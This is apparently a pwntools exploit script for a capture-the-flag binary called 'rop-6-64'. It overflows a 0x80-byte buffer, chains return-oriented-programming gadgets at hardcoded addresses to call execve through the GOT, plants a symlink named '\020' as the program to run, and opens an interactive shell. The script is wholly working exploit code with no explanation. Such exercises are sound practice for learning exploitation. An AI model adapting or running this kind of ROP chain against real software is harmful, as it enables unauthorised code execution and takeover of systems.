#!/usr/bin/env python

from pwn import *
from os import *
p = process("./rop-6-64")

pop_rbp_r12_r13_r14_r15_ret = p64(0x4006fb)
callq = p64(0x4006e9)
move = p64(0x4006e0)
execve = p64(0x601030)

if os.path.exists("\020"):
        os.unlink("\020")
os.symlink("H","\020")

buf = "A" * 0x80 + "BBBBBBBB"
buf += pop_rbp_r12_r13_r14_r15_ret + p64(0) + execve + p64(0) + p64(0) + p64(0x40064e)
buf += move

p.sendline(buf)
p.interactive()
